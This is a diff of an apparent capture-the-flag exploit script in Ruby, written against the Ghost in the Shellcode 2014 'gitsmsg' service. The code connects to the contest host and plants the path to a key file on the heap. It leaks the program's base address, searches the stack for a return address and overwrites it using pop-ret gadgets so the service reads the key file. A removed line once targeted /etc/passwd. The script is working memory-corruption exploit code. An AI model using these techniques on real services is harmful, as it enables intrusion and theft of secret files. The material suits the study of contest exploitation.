@@ -19,6 +19,12 @@ VARDATA_TYPE_STRING       = 0x16
 
 @@sent = 0
 
+# 10 A's, followed by a null (so it doesn't wind up too long), then pad
+# the rest of the way to 0x100 bytes (the required length)
+DEFAULT_FROM_USERNAME = ("A" * 10) + "\0" + "A" * (0x100 - 11)
+DEFAULT_TO_USERNAME   = ("B" * 10) + "\0" + "B" * (0x100 - 11)
+KEY_PATH              = "/home/gitsmsg/key"
+
 def get_int(s, context = "?")
   int = s.recv(4)
 
@@ -37,28 +43,16 @@ def receive_code(s, expected, context)
     puts("Error! Unexpected response: 0x%08x :: %s" % [code, context])
     exit
   end
-
-  #puts("Success: %08x :: %s" % [code, context])
 end
 
-def login(s, username = ("A" * 10) + "\0" + "A" * (0x100 - 11))
+def login(s, username = DEFAULT_FROM_USERNAME)
   out = [MESSAGE_LOGIN, username].pack("Ia*")
   s.write(out)
   receive_code(s, 0x00001001, "login")
 end
 
-def send_queued(s)
-  out = [MESSAGE_SEND_QUEUED].pack("I")
-  s.write(out)
-
-  0.upto(@@sent-1) do
-    receive_code(s, 0x00001006, "send_queued")
-  end
-  receive_code(s, 0x00001004, "send_queued_finished")
-end
-
 # Sends a 0x04 message (store)
-def store(s, vardata_type, vardata, to_username = ("B" * 10) + "\0" + "B" * (0x100 - 11))
+def store(s, vardata_type, vardata, to_username = DEFAULT_TO_USERNAME)
   @@sent += 1
   out = [MESSAGE_STORE, to_username].pack("Ia*")
 
@@ -99,13 +93,18 @@ def get(s, id)
   out = [MESSAGE_GET, id].pack("II")
   s.write(out)
 
-  type = get_int(s)
+  # Type (don't care)
+  get_int(s)
+
+  # Length
   len = get_int(s)
 
   #puts("Retrieving #{len} bytes")
   data = s.recv(len)
 
+  # It should end with this code
   receive_code(s, 0x00001004, "get")
+
   return data
 
 end
@@ -150,7 +149,7 @@ PPR  = 0x00002756
 # Pop ret
 PR   = 0x00002757
 
-def find_return_address(s, address_to_find, file_path, base, fd)
+def find_return_address(s, address_to_find)
   address_to_find = [address_to_find].pack("I")
 
   store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x5e5e5e5e5e5e5e5e] * 4)
@@ -161,7 +160,7 @@ def find_return_address(s, address_to_find, file_path, base, fd)
 
   out = [MESSAGE_GET, 0].pack("II")
   s.write(out)
-  type = get_int(s)
+  get_int(s) # type (don't care)
   len = get_int(s)
   puts("Retrieving #{len} bytes")
   result = ""
@@ -230,13 +229,13 @@ end
 #s = TCPSocket.new("localhost", 8585)
 s = TCPSocket.new("gitsmsg.2014.ghostintheshellcode.com", 8585)
 
-puts("Initializing")
+puts("** Initializing")
 receive_code(s, 0x00001000, "init")
 
-puts("Logging in")
+puts("** Logging in")
 login(s)
 
-#file_path = hide_data(s, "/etc/passwd\0" + ("A"*100))
+puts("** Stashing a path to the file on the heap")
 file_path = hide_data(s, "/home/gitsmsg/key\0" + ("A"*100))
 
 base_addr = get_base_address(s)
@@ -249,7 +248,7 @@ puts("... it's #{fd}!")
 address_to_overwrite = base_addr + 0x0e74
 puts("Searching the stack for 0x%08x" % address_to_overwrite)
 
-return_address = find_return_address(s, address_to_overwrite, file_path, base_addr, fd)
+return_address = find_return_address(s, address_to_overwrite)
 puts("Found return address @ 0x%08x" % return_address)
 
 change_return_address(s, return_address, file_path, base_addr, fd)
